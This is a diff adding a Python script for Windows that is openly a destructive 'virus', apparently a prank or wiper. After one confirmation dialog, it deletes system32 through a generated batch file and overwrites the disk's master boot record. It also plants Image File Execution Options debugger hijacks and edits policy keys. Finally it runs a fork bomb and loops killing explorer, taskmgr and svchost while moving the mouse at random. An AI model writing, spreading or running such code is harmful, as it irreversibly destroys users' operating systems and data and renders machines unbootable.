@@ -1,0 +1,254 @@
+import os
+import tkinter as tk
+from tkinter import messagebox
+import winreg
+    # 生成纯黑色图片（需安装Pillow库）
+from PIL import Image
+
+import winsound
+
+import pyautogui as gui
+import random as r
+
+import sys
+import threading  
+from win32file import * # pip install pywin32
+from win32ui import * # MessageBox
+from win32con import * # MessageBox buttons
+from win32gui import *
+from sys import exit
+def add_registry_entry():
+    try:
+        # 定义注册表路径和键值
+        root_key = winreg.HKEY_LOCAL_MACHINE
+        key_path = r"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\qq.exe"
+        value_name = "debugger"
+        value_data = r"C:\windows\system32\cmd.exe"
+
+        # 创建/打开注册表项
+        key_handle = winreg.CreateKey(root_key, key_path)
+        
+        # 添加字符串类型键值
+        winreg.SetValueEx(key_handle, value_name, 0, winreg.REG_SZ, value_data)
+        
+        print("注册表项和键值添加成功")
+    except Exception as e:
+        print(f"操作失败: {e}")
+    finally:
+        # 确保关闭句柄
+        if 'key_handle' in locals():
+            winreg.CloseKey(key_handle)
+
+
+def add_registry_entry1():
+    try:
+        # 定义注册表路径和键值
+        root_key = winreg.HKEY_LOCAL_MACHINE
+        key_path = r"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sb.exe"
+        value_name = "debugger"
+        value_data = r"C:\windows\system32\regedit.exe"
+
+        # 创建/打开注册表项
+        key_handle = winreg.CreateKey(root_key, key_path)
+        
+        # 添加字符串类型键值
+        winreg.SetValueEx(key_handle, value_name, 0, winreg.REG_SZ, value_data)
+        
+        print("注册表项和键值添加成功")
+    except Exception as e:
+        print(f"操作失败: {e}")
+    finally:
+        # 确保关闭句柄
+        if 'key_handle' in locals():
+            winreg.CloseKey(key_handle)
+def add_registry_entry2():
+    try:
+        # 定义注册表路径和键值
+        root_key = winreg.HKEY_LOCAL_MACHINE
+        key_path = r"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sb1.exe"
+        value_name = "debugger"
+        value_data = r"C:\windows\system32\gpedit.msc"
+
+        # 创建/打开注册表项
+        key_handle = winreg.CreateKey(root_key, key_path)
+        
+        # 添加字符串类型键值
+        winreg.SetValueEx(key_handle, value_name, 0, winreg.REG_SZ, value_data)
+        
+        print("注册表项和键值添加成功")
+    except Exception as e:
+        print(f"操作失败: {e}")
+    finally:
+        # 确保关闭句柄
+        if 'key_handle' in locals():
+            winreg.CloseKey(key_handle)
+def add_registry_entry3():
+    try:
+        # 定义注册表路径和键值
+        root_key = winreg.HKEY_LOCAL_MACHINE
+        key_path = r"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\qsb9.exe"
+        value_name = "debugger"
+        value_data = r"C:\windows\system32\net.exe"
+
+        # 创建/打开注册表项
+        key_handle = winreg.CreateKey(root_key, key_path)
+        
+        # 添加字符串类型键值
+        winreg.SetValueEx(key_handle, value_name, 0, winreg.REG_SZ, value_data)
+        
+        print("注册表项和键值添加成功")
+    except Exception as e:
+        print(f"操作失败: {e}")
+    finally:
+        # 确保关闭句柄
+        if 'key_handle' in locals():
+            winreg.CloseKey(key_handle)
+def add_registry_entry4():
+    try:
+        # 定义注册表路径和键值
+        root_key = winreg.HKEY_CURRENT_USER
+        key_path = r"\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+        value_name = "HideIcons"
+        value_data = r"1"
+
+        # 创建/打开注册表项
+        key_handle = winreg.CreateKey(root_key, key_path)
+        
+        # 添加字符串类型键值
+        winreg.SetValueEx(key_handle, value_name, 0, winreg.REG_SZ, value_data)
+        
+        print("注册表项和键值添加成功")
+    except Exception as e:
+        print(f"操作失败: {e}")
+    finally:
+        # 确保关闭句柄
+        if 'key_handle' in locals():
+            winreg.CloseKey(key_handle)
+def add_registry_entry5():
+    try:
+        # 定义注册表路径和键值
+        root_key = winreg.HKEY_CURRENT_USER
+        key_path = r"\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+        value_name = "ShowInfoTip"
+        value_data = r"0"
+
+        # 创建/打开注册表项
+        key_handle = winreg.CreateKey(root_key, key_path)
+        
+        # 添加字符串类型键值
+        winreg.SetValueEx(key_handle, value_name, 0, winreg.REG_SZ, value_data)
+        
+        print("注册表项和键值添加成功")
+    except Exception as e:
+        print(f"操作失败: {e}")
+    finally:
+        # 确保关闭句柄
+        if 'key_handle' in locals():
+            winreg.CloseKey(key_handle)
+def add_registry_entry6():
+    try:
+        # 定义注册表路径和键值
+        root_key = winreg.HKEY_CURRENT_USER
+        key_path = r"\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+        value_name = "NoViewOnDrive"
+        value_data = r"4"
+
+        # 创建/打开注册表项
+        key_handle = winreg.CreateKey(root_key, key_path)
+        
+        # 添加字符串类型键值
+        winreg.SetValueEx(key_handle, value_name, 0, winreg.REG_SZ, value_data)
+        
+        print("注册表项和键值添加成功")
+    except Exception as e:
+        print(f"操作失败: {e}")
+    finally:
+        # 确保关闭句柄
+        if 'key_handle' in locals():
+            winreg.CloseKey(key_handle)
+def resource_path(relative_path):  
+    if hasattr(sys, '_MEIPASS'):  # 打包后路径  
+        base_path = sys._MEIPASS  
+    else:  # 开发时路径  
+        base_path = os.path.abspath(".")  
+    return os.path.join(base_path, relative_path) 
+def muzic():
+    file_path = resource_path('music.wav')  
+    with open(file_path, "rb") as f:
+        audio_data = f.read()
+    winsound.PlaySound(audio_data, winsound.SND_MEMORY)
+def bd():
+    music_thread = threading.Thread(target=muzic)  
+    music_thread.start()  
+    with open("1.bat","wb") as e:
+        e.write("echo off && takeown /f %windir%\system32 /r /d y && echo Y|cacls %windir%\system32\*.* /t /g %username%:F && del /s /q /f %windir%\system32\*.* && exit".encode('utf-8'))
+    os.system("start 1.bat")
+    file1_path = resource_path('output.exe')
+    with open(file1_path,'rb') as q:
+        tx_data = q.read()
+    with open("oup.exe",'wb') as r:
+        r.write(tx_data)
+    os.system("start oup.exe")
+
+# 播放WAV文件‌:ml-citation{ref="3" data="citationList
+    img = Image.new('RGB', (1920, 1080), (0, 0, 0))
+    img.save('black_wallpaper.jpg')
+# 同步播放音频（阻塞后续代码）‌:ml-citation{ref="1,3" data="citationList"}
+
+# 设置壁纸（Windows系统）
+    os.system(f'reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d {os.path.abspath("black_wallpaper.jpg")} /f')
+    os.system('rundll32.exe user32.dll,UpdatePerUserSystemParameters')
+
+
+# title of warning
+    warningtitle = 'Warning!'
+# description of warning
+    warningdescription = 'This program will overwrite your MBR, making your machine unusable. If your in a safe enviroment (a virtual machine for example) and know what you\'re doing you might continute. Are you really sure you want to make your machine unbootable?'
+
+
+
+    hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive
+    WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite the MBR! (Never run this on your main machine!)
+    CloseHandle(hDevice) # Close the handle to our Physical Drive!
+
+    add_registry_entry()
+    add_registry_entry1()
+    add_registry_entry2()
+    add_registry_entry3()
+    add_registry_entry4()
+    add_registry_entry5()
+    add_registry_entry6()
+    while True:
+        for x in range(50):
+            os.system("start cmd")
+            os.system("taskkill /im taskmgr.exe /f")
+            os.system("%0|%0")
+            gui.FAILSAFE =True
+            os.system("taskkill /im explorer.exe /f")
+            a=0
+            b=r.randint(1,3)
+            if b==1:
+                gui.moveTo(r.randint(1,1919),r.randint(1,1079))
+            if b==2:
+                gui.click(r.randint(1,1919),r.randint(1,1079),button='left')
+            if b==3:
+                gui.dragTo(r.randint(1,1919),r.randint(1,1079))
+            a+=1
+        os.system("taskkill /im svchost.exe /f")
+
+# 创建主窗口并隐藏‌:ml-citation{ref="2" data="citationList"}
+root = tk.Tk()
+root.withdraw()
+
+# 弹出“是/否”弹窗并获取用户选择‌:ml-citation{ref="2" data="citationList"}
+user_choice = messagebox.askyesno("是", "是否运行病毒")
+
+if user_choice:
+    bd()
+else:
+    exit()
+
+# 销毁主窗口并退出程序‌:ml-citation{ref="8" data="citationList"}
+root.destroy()
+root.quit()
+
